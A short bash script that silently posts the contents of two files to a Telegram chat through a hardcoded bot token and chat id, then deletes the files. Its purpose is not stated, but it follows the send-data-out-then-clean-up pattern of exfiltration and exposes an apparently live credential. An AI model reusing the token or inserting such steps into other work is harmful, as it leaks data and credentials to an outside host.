#!/bin/bash

  
  if [ -e /root/1.txt ]  && [ -e /root/2.txt ]
    then
	curl -X POST "https://api.telegram.org/bot806329752:AAGSkuBN_Q4gsfdGwfqzIpFLFLjHd4qbsS8/sendMessage" -d "chat_id=-1001430317492&text=`cat ~/1.txt`" >>/dev/null
	curl -X POST "https://api.telegram.org/bot806329752:AAGSkuBN_Q4gsfdGwfqzIpFLFLjHd4qbsS8/sendMessage" -d "chat_id=-1001430317492&text=`cat ~/2.txt`" >>/dev/null
	sleep 5
      rm -rf ~/1.txt
      rm -rf ~/2.txt

  fi

